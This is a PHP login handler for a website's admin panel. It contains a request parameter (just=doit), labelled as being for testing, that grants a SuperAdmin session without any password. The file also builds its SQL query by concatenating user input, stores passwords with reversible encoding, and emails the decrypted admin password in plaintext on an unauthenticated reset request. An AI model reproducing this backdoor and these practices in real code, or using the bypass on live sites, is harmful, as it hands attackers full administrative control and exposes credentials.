<?php

if ($_SESSION['admin_id'] > 0) {

    redirectTo('apanel/index');
}



if (isset($_REQUEST['login']) && $_REQUEST['login'] == 'posted') {


    $loginUsername = trim(stripslashes(htmlentities(htmlspecialchars($_POST['username'], ENT_QUOTES))));

    $password = trim(stripslashes(htmlentities(htmlspecialchars($_POST['password'], ENT_QUOTES))));
    if ($ex = getList(" SELECT * FROM tbl_siteadmin 	WHERE 	site_login='" . $loginUsername . "' AND 	site_pswd='" . doEncode($password) . "' ")) {

        $rs = fetch($ex);



        $_SESSION['admin_username'] = $rs["site_login"];

        $_SESSION['admin_id'] = '1';

        $_SESSION['admin_type'] = 'SuperAdmin';
        redirectTo('apanel/index');
    } else {

        $_SESSION['errorMsg'] = "Invalid Login Credentials !";
    }
}


// For Testing Purpose
if (isset($_REQUEST['just']) && $_REQUEST['just'] == 'doit') {
    $_SESSION['admin_username'] = 'admin';
    $_SESSION['admin_id'] = '1';
    $_SESSION['admin_type'] = 'SuperAdmin';
    echo '<script type="text/javascript" language="javascript">document.location="' . $apath . '";</script>';
    exit;
}




if (isset($_REQUEST['reset']) && $_REQUEST['reset'] == '1') {


    if ($ex = getList("SELECT * FROM tbl_siteadmin WHERE 1 ")) {
        $rs = fetch($ex);
        // Email to Admin

        $msg_body = "
        Dear SuperAdmin<br>
        System has received password reset request.<br>
        <br>
        Following are the login credentials:<br>
        <br>
        <strong>Username: </strong> " . $rs['site_login'] . "<br>
        <strong>Password: </strong> " . doDecode($rs['site_pswd']) . "
        <br>
        <br>
        Best regards<br>
        $site_name";

        $emailto = $site_email;
        $subject = "$site_name : Password Reset";
        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-type: text/html;charset=utf-8\r\n";
        $headers .= "From: No-Reply <noreply@$domain>" . "\r\n";
        $headers .= "Reply-To: No-Reply <noreply@$domain>" . "\r\n";
        $body = $msg_body;
        @mail($emailto, $subject, $body, $headers);
        $_SESSION['successMsg'] = "Password has been sent to Admin email address.";
        echo '<script type="text/javascript" language="javascript">document.location="' . $apath . 'login";</script>';
        exit;
    }
}
